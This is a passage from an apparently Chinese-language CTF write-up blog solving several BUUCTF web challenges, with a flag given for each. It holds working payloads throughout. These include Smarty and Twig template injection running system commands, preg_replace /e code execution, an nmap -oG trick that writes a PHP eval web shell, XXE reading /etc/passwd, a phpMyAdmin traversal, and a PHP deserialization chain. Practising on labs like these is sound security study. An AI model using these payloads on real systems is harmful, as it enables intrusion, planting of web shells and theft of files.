</code></pre><p>find找到flag位置/tmp/flagoefiu4r93，再用cat读即可：flag{375cd5d4-9399-46b7-ab50-ab3ae8b4ab7a}</p><hr><h2 id=bjdctf2020the-mystery-of-ip>[BJDCTF2020]The mystery of ip<a hidden class=anchor aria-hidden=true href=#bjdctf2020the-mystery-of-ip>#</a></h2><p>hint.php提示：<code>Do you know why i know your ip?</code>，试了试XFF，发现flag.php中的ip是通过XFF来获取拼接的，只想到了能XSS，可以通过标签指定language为PHP来rce：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>language</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;php&#34;</span>&gt;<span style=color:#a6e22e>phpinfo</span>();&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><p>但是没回显，查了<a href=https://www.php.net/manual/zh/migration70.incompatible.php>资料</a>发现这种方法在PHP 7+中已经被移除了，本题PHP版本为7.3.13，没思路了</p><p>看了wp说是<a href=https://xz.aliyun.com/news/11666>smarty模板注入</a>：</p><pre tabindex=0><code>{$smarty.version}  #获取smarty的版本号
Your IP is : 3.1.34-dev-7

{php}phpinfo();{/php}  #执行相应的php代码，但是Smarty3版本中已经废弃{php}标签，本题无法使用

{literal}alert(&#39;xss&#39;);{/literal}  #也是XSS，用来避免js被误解析

{if phpinfo()}{/if}  #Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||，or，&amp;&amp;，and，is_array()等等
</code></pre><pre tabindex=0><code>{if system(&#39;cat /flag&#39;)}{/if}
Your IP is : flag{f9a2b969-f4d4-4168-a4f5-137fb7f46b37}
</code></pre><hr><h2 id=bjdctf2020zjctf不过如此>[BJDCTF2020]ZJCTF，不过如此<a hidden class=anchor aria-hidden=true href=#bjdctf2020zjctf不过如此>#</a></h2><pre tabindex=0><code>?text=data:,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php
</code></pre><p>next.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$id <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;id&#39;</span>];
</span></span><span style=display:flex><span>$_SESSION[<span style=color:#e6db74>&#39;id&#39;</span>] <span style=color:#f92672>=</span> $id;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>complex</span>($re, $str) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_replace</span>(
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;/(&#39;</span> <span style=color:#f92672>.</span> $re <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;)/ei&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;strtolower(&#34;\\1&#34;)&#39;</span>,
</span></span><span style=display:flex><span>        $str
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($_GET <span style=color:#66d9ef>as</span> $re <span style=color:#f92672>=&gt;</span> $str) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>complex</span>($re, $str)<span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getFlag</span>(){
</span></span><span style=display:flex><span>	<span style=color:#f92672>@</span><span style=color:#66d9ef>eval</span>($_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>]);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>preg_replace /e模式导致第二个参数可以被当作php语句执行，foreach的参数是$_GET，因此没必要传id</p><pre tabindex=0><code>?.*=${phpinfo()};
</code></pre><p>拼接后：</p><pre tabindex=0><code>preg_replace(&#39;(.*)/ei&#39;,&#39;strtolower(&#34;\\1&#34;)&#39;,&#39;phpinfo();&#39;);
</code></pre><p>但在php中当非法字符为首字母时，只有点号会被替换成下划线，所以换一个参数名即可，\S表示匹配所有非空白符：</p><pre tabindex=0><code>?\S*=${phpinfo()};
</code></pre><p>在php中上面的payload等价于执行如下语句，花括号内为表达式，先执行表达式，再尝试访问$变量：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>phpinfo()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>;  <span style=color:#75715e>// ${expr} (variable variables)
</span></span></span></code></pre></div><p>由于引号会被转义，所以只能调用getFlag()，最终payload：</p><pre tabindex=0><code>?\S*=${getFlag()};&amp;cmd=system(&#39;cat /flag&#39;);
</code></pre><p>flag{3ce52793-2870-4076-a120-b6931631542f}</p><hr><h2 id=buuctf-2018online-tool>[BUUCTF 2018]Online Tool<a hidden class=anchor aria-hidden=true href=#buuctf-2018online-tool>#</a></h2><p>escapeshellarg和escapeshellcmd的联合使用 + 未将用户输入置于参数位</p><p>escapeshellarg会在单引号之前加上 <code>\</code>, 并在被转义的单引号两边和整个字符串两边加上单引号</p><p>escapeshellcmd会在所有的 <code>\</code> 前加上 <code>\</code>，并在单独的单引号（未成对的）前加 <code>\</code></p><p>尝试将命令的<a href=https://nmap.org/man/zh/man-output.html>输出</a>结果保存到文件中，这样可以实现写入一句话木马</p><p>一开始尝试了-oN，保存的文件内容中<code>"\&lt;?php".</code>会导致php解析报错，无法拿shell：</p><pre tabindex=0><code># Nmap 7.70 scan initiated Sat Jul 19 00:48:27 2025 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oN aaa.php \&lt;?php @eval($_POST[1]) ?&gt; \\
Failed to resolve &#34;\&lt;?php&#34;.
Failed to resolve &#34;eval($_POST[1])&#34;.
Failed to resolve &#34;?&gt;&#34;.
Failed to resolve &#34;\\&#34;.
WARNING: No targets were specified, so 0 hosts scanned.
# Nmap done at Sat Jul 19 00:48:27 2025 -- 0 IP addresses (0 hosts up) scanned in 0.05 seconds
</code></pre><p>后来尝试-oG (Grepable 格式)，shell.php可以被解析</p><pre tabindex=0><code>?host=&#39;&lt;?php @eval($_POST[1]) ?&gt; -oG shell.php &#39;
</code></pre><p>escapeshellarg后：</p><pre tabindex=0><code>&#39;&#39;\&#39;&#39;&lt;?php @eval($_POST[1]) ?&gt; -oG shell.php &#39;\&#39;&#39;&#39;
</code></pre><p>escapeshellcmd后（没有单独的单引号）：</p><pre tabindex=0><code>&#39;&#39;\\&#39;&#39;&lt;?php @eval($_POST[1]) ?&gt; -oG shell.php &#39;\\&#39;&#39;&#39;
</code></pre><p>完整的执行命令：</p><pre tabindex=0><code>nmap -T5 -sT -Pn --host-timeout 2 -F \\&lt;?php @eval($_POST[1]) ?&gt; -oG shell.php \\
</code></pre><p>shell.php：</p><pre tabindex=0><code># Nmap 7.70 scan initiated Sat Jul 19 00:53:51 2025 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG shell.php \&lt;?php @eval($_POST[1]) ?&gt; \\
# Nmap done at Sat Jul 19 00:53:51 2025 -- 0 IP addresses (0 hosts up) scanned in 0.06 seconds
</code></pre><p>flag{a8339bf9-7e19-4606-9937-7b59a8e81acf}</p><hr><h2 id=gxyctf2019禁止套娃>[GXYCTF2019]禁止套娃<a hidden class=anchor aria-hidden=true href=#gxyctf2019禁止套娃>#</a></h2><p>访问.git响应码403，.git源码泄露：</p><pre tabindex=0><code>python GitHack.py http://287013c6-0b05-48bd-8df7-1b30898ed1a1.node5.buuoj.cn:81/.git/
</code></pre><p>index.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;flag.php&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;flag在哪里呢？&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;exp&#39;</span>])){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;</span>, $_GET[<span style=color:#e6db74>&#39;exp&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#e6db74>&#39;;&#39;</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#39;/[a-z,_]+\((?R)?\)/&#39;</span>, <span style=color:#66d9ef>NULL</span>, $_GET[<span style=color:#e6db74>&#39;exp&#39;</span>])) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;</span>, $_GET[<span style=color:#e6db74>&#39;exp&#39;</span>])) {
</span></span><span style=display:flex><span>                <span style=color:#75715e>// echo $_GET[&#39;exp&#39;];
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#f92672>@</span><span style=color:#66d9ef>eval</span>($_GET[<span style=color:#e6db74>&#39;exp&#39;</span>]);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;还差一点哦！&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;再好好想想！&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;还想读flag，臭弟弟！&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>// highlight_file(__FILE__);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>只允许执行形如func()的函数，考虑无参rce，随机爆出flag.php：</p><pre tabindex=0><code>?exp=var_dump(scandir(current(localeconv())));
array(5) { [0]=&gt; string(1) &#34;.&#34; [1]=&gt; string(2) &#34;..&#34; [2]=&gt; string(4) &#34;.git&#34; [3]=&gt; string(8) &#34;flag.php&#34; [4]=&gt; string(9) &#34;index.php&#34; } 

?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));
&lt;?php
$flag = &#34;flag{49c2ad3e-a178-43b4-8abe-019245914871}&#34;;
?&gt; 
</code></pre><p>看了其他师傅的wp，有稳定读出flag.php的方法：</p><pre tabindex=0><code>?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));
</code></pre><hr><h2 id=nctf2019fake-xml-cookbook>[NCTF2019]Fake XML cookbook<a hidden class=anchor aria-hidden=true href=#nctf2019fake-xml-cookbook>#</a></h2><p>xxe，username回显：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE user [
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;user&gt;&lt;username&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/username&gt;&lt;password&gt;</span>456<span style=color:#f92672>&lt;/password&gt;&lt;/user&gt;</span>
</span></span></code></pre></div><p>payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE user [
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;</span>
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;user&gt;&lt;username&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/username&gt;&lt;password&gt;</span>456<span style=color:#f92672>&lt;/password&gt;&lt;/user&gt;</span>
</span></span></code></pre></div><p>flag{9ee04b17-fc13-4ff2-a6c1-44fc20929f0b}</p><hr><h2 id=gwctf-2019我有一个数据库>[GWCTF 2019]我有一个数据库<a hidden class=anchor aria-hidden=true href=#gwctf-2019我有一个数据库>#</a></h2><p>直接访问得到乱码，其实是编码方式不统一导致的：</p><pre tabindex=0><code>鎴戞湁涓€涓暟鎹簱锛屼絾閲岄潰浠€涔堜篃娌℃湁~
涓嶄俊浣犳壘

GBK-&gt;UTF-8
我有一个数据库，但里面什么也没有~
不信你找
</code></pre><p>robots.txt：</p><pre tabindex=0><code>User-agent: *
Disallow: phpinfo.php
</code></pre><p>扫描发现有phpmyadmin，根据版本找找CVE：<a href=https://blog.csdn.net/qq_45521281/article/details/105780497>phpMyAdmin 4.8.1后台文件包含漏洞（CVE-2018-12613）</a></p><p>目录穿越：</p><pre tabindex=0><code>?target=db_sql.php%253f/../../../../../../../../flag
</code></pre><p>flag{f1cd2c40-be69-4549-ba63-d563837319d0}</p><hr><h2 id=bjdctf2020mark-loves-cat>[BJDCTF2020]Mark loves cat<a hidden class=anchor aria-hidden=true href=#bjdctf2020mark-loves-cat>#</a></h2><p>.git源码泄露：</p><p>index.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;flag.php&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$yds <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;dog&#34;</span>;
</span></span><span style=display:flex><span>$is <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cat&#34;</span>;
</span></span><span style=display:flex><span>$handsome <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;yds&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($_POST <span style=color:#66d9ef>as</span> $x <span style=color:#f92672>=&gt;</span> $y){
</span></span><span style=display:flex><span>    $$x <span style=color:#f92672>=</span> $y;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($_GET <span style=color:#66d9ef>as</span> $x <span style=color:#f92672>=&gt;</span> $y){
</span></span><span style=display:flex><span>    $$x <span style=color:#f92672>=</span> $$y;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($_GET <span style=color:#66d9ef>as</span> $x <span style=color:#f92672>=&gt;</span> $y){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>($_GET[<span style=color:#e6db74>&#39;flag&#39;</span>] <span style=color:#f92672>===</span> $x <span style=color:#f92672>&amp;&amp;</span> $x <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;flag&#39;</span>){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>($handsome);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;flag&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;flag&#39;</span>])){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>($yds);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_POST[<span style=color:#e6db74>&#39;flag&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;flag&#39;</span>  <span style=color:#f92672>||</span> $_GET[<span style=color:#e6db74>&#39;flag&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;flag&#39;</span>){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>($is);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;the flag is: &#34;</span><span style=color:#f92672>.</span>$flag;
</span></span></code></pre></div><p>flag.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$flag <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#e6db74>&#39;/flag&#39;</span>);
</span></span></code></pre></div><p>尝试传入?yds=flag，第二个foreach会执行<code>$yds = $flag;</code>，由于未传入flag参数，所以会执行exit($yds);输出flag：</p><p>flag{2c9108b6-b53e-4aae-a2ae-fba4fc401577}</p><hr><h2 id=wustctf2020朴实无华>[WUSTCTF2020]朴实无华<a hidden class=anchor aria-hidden=true href=#wustctf2020朴实无华>#</a></h2><p>访问/fAke_f1agggg.php，header里有hint：</p><pre tabindex=0><code>look_at_me：/fl4g.php
</code></pre><p>fl4g.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/img.jpg&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-type:text/html;charset=utf-8&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__file__</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//level 1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;num&#39;</span>])){
</span></span><span style=display:flex><span>    $num <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;num&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>intval</span>($num) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2020</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>intval</span>($num <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>2021</span>){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&#34;</span>;
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;鍘婚潪娲插惂&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//level 2
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;md5&#39;</span>])){
</span></span><span style=display:flex><span>   $md5<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;md5&#39;</span>];
</span></span><span style=display:flex><span>   <span style=color:#66d9ef>if</span> ($md5<span style=color:#f92672>==</span><span style=color:#a6e22e>md5</span>($md5))
</span></span><span style=display:flex><span>       <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&#34;</span>;
</span></span><span style=display:flex><span>   <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>       <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&#34;</span>);
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;鍘婚潪娲插惂&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//get flag
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;get_flag&#39;</span>])){
</span></span><span style=display:flex><span>    $get_flag <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;get_flag&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>strstr</span>($get_flag,<span style=color:#e6db74>&#34; &#34;</span>)){
</span></span><span style=display:flex><span>        $get_flag <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_ireplace</span>(<span style=color:#e6db74>&#34;cat&#34;</span>, <span style=color:#e6db74>&#34;wctf2020&#34;</span>, $get_flag);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>system</span>($get_flag);
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;蹇埌闈炴床浜�&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;鍘婚潪娲插惂&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>科学计数法+0e+${IFS}绕过：</p><pre tabindex=0><code>?num=2019e1&amp;md5=0e215962017&amp;get_flag=tac${IFS}fll*
</code></pre><p>flag{49c90321-da30-42cb-90b6-f262f3e55eae}</p><hr><h2 id=bjdctf2020cookie-is-so-stable>[BJDCTF2020]Cookie is so stable<a hidden class=anchor aria-hidden=true href=#bjdctf2020cookie-is-so-stable>#</a></h2><p>注入点为Cookie中的user，尝试设置user={{2*2}}，flag.php页面回显4，确定是twig模板，<a href=https://xz.aliyun.com/news/11762>相关文章</a>：</p><pre tabindex=0><code>user={{_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}{{_self.env.getFilter(&#34;cat /flag&#34;)}}
</code></pre><p>flag{413ac946-069a-4427-88fc-de20189c7b40}</p><hr><h2 id=mrctf2020ezpop>[MRCTF2020]Ezpop<a hidden class=anchor aria-hidden=true href=#mrctf2020ezpop>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Modifier</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span>  $var <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $source;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $str;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $p;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$a <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Modifier</span>();
</span></span><span style=display:flex><span>$b <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span>();
</span></span><span style=display:flex><span>$b<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> $a;
</span></span><span style=display:flex><span>$c <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
</span></span><span style=display:flex><span>$c<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span> <span style=color:#f92672>=</span> $b;
</span></span><span style=display:flex><span>$d <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
</span></span><span style=display:flex><span>$d<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $c;
</span></span><span style=display:flex><span><span style=color:#66d9ef>print</span>(<span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($d)));
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>payload：</p><pre tabindex=0><code>?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
</code></pre><p>flag.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Flag</span>{
